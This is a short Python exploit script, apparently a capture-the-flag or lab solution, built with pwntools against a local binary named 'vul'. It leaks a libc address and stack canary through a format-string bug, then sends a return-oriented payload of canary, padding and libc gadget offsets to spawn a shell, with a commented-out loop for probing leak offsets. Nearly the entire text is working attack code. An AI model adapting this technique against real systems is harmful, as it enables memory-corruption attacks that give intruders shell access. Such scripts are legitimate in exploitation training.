from platform import architecture
from pwn import *
context(os = "linux", arch = "amd64")

bin = context.binary = ELF("vul")
libc_main = context.binary = ELF("/usr/lib/x86_64-linux-gnu/libc-2.33.so", checksec=False)

# end = ""
# for idx in range(20):
#     vul = process("./vul")
#     vul.sendline("%{}$lx".format(idx))
#     vul.recvline()
#     end += "{} : {}\n".format(idx, vul.recvline()) #libc %3$lx off = EA453 : %7$lx offset = 1080 : %9$lx canar
#     vul.close()
# print(end)


vul = process("./vul")
vul.sendline("%3$lx-%9$lx")
print(vul.recvline())
addresses = vul.recv().strip().split(b'-')
libc = int (addresses[0], 16) - 0xea453
canary = int(addresses[1], 16)
log.success("Leaked addresses " + hex(libc) + " and " + hex(canary))
payload = flat(b'A' * 24, canary, b'A' * 8, libc + 0x23c5d ,  0x194882 + libc, 0x45880 + libc)
vul.sendline(payload)
vul.interactive()
vul.close()